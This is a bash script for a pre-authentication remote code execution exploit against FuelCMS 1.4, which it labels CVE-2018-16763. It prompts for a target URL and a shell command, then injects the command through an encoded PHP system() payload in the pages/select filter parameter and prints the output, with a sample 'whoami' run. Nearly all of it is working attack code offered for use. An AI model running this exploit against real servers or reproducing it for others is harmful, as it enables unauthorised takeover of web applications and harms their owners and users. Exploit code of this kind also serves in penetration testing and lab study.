#!/bin/bash
#Creator: kxisxr
greenColour="\x1B[0;32m\033[1m"
endColour="\033[0m\x1B[0m"
redColour="\x1B[0;31m\033[1m"
blueColour="\x1B[0;34m\033[1m"
yellowColour="\x1B[0;33m\033[1m"
purpleColour="\x1B[0;35m\033[1m"
turquoiseColour="\x1B[0;36m\033[1m"
grayColour="\x1B[0;37m\033[1m"

echo -e "${greenColour}""

   ______     _______     ____   ___  _  ___        _  __ _____ __  _____ 
  / ___\ \   / / ____|   |___ \ / _ \/ |( _ )      / |/ /|___  / /_|___ / 
 | |    \ \ / /|  _| _____ __) | | | | |/ _ \ _____| | '_ \ / / '_ \ |_ \ 
 | |___  \ V / | |__|_____/ __/| |_| | | (_) |_____| | (_) / /| (_) |__) |
  \____|  \_/  |_____|   |_____|\___/|_|\___/      |_|\___/_/  \___/____/ 
                                                                          
"${redColour}"'FuelCMS 1.4 Pre-Auth Remote Code Execution.'"${endColour}"

by kxisxr
@pixelbit131
""${endColour}"

echo -e "${blueColour}"'-----------------------------------------------------------------------------'"${endColour}"
echo -e ' '

echo -e -n "${greenColour}"'Ip or URL: '"${endColour}"
read link
echo -e -n "${yellowColour}"'Payload: '"${endColour}"
read raw_payload
echo -e ' '

#EXAMPLE

#Target link: http://10.10.71.97/
#Payload: whoami

#www-data

encoded_payload=$(urlencode $raw_payload)

curl -s -g "$link/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"$encoded_payload"%27%29%2b%27" | sed -n '47,500p' | tr ">" "\n" | grep -vE "<p|</p|h4|<div|br|</div" | awk NF |  tail -n 60 | sed 's/^system$/ /g' | sort -u
